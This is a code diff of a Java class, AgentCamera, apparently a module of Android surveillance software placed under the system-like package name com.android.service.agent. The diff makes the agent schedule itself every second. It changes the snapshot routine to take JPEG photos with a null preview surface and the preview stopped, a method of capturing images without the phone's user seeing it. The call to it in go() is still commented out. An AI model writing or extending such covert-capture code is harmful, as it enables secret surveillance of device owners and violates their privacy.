@@ -9,16 +9,19 @@
 
 package com.android.service.agent;
 
+import java.io.IOException;
+
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.ShutterCallback;
-import android.util.Log;
+import android.view.SurfaceHolder;
 
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
-// TODO: Auto-generated Javadoc
-//SNIPPET
+
+//SNIPPET http://marakana.com/forums/android/examples/39.html
 /**
  * The Class CameraAgent.
  */
@@ -49,7 +52,8 @@ public class AgentCamera extends AgentBase {
 	 */
 	@Override
 	public boolean parse(AgentConf conf) {
-		return false;
+		setPeriod(1000);
+		return true;
 	}
 
 	/* (non-Javadoc)
@@ -57,29 +61,29 @@ public class AgentCamera extends AgentBase {
 	 */
 	@Override
 	public void go() {
-		// TODO Auto-generated method stub
-
+		//snapshot();
 	}
 
 	/**
 	 * Snapshot.
+	 * @throws IOException 
 	 */
-	private void snapshot() {
+	private synchronized void snapshot() throws IOException {
 
 		final ShutterCallback shutterCallback = new ShutterCallback() {
 
-			public void onShutter() {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " onShutter");
+			public void onShutter() {	
+				if(Cfg.DEBUG) Check.log( TAG + " onShutter");
 			}
 		};
 		final PictureCallback rawCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " onPictureTaken RAW");
+				if(Cfg.DEBUG) Check.log( TAG + " onPictureTaken RAW");
 			}
 		};
 		final PictureCallback jpegCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " onPictureTaken JPEG");
+				if(Cfg.DEBUG) Check.log( TAG + " onPictureTaken JPEG");
 			}
 		};
 
@@ -87,6 +91,9 @@ public class AgentCamera extends AgentBase {
 		final Camera.Parameters parameters = camera.getParameters();
 		parameters.setPictureFormat(PixelFormat.JPEG);
 		camera.setParameters(parameters);
+		SurfaceHolder holder = null;
+		camera.setPreviewDisplay(holder);
+		camera.stopPreview();
 		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
 
 		camera.release();
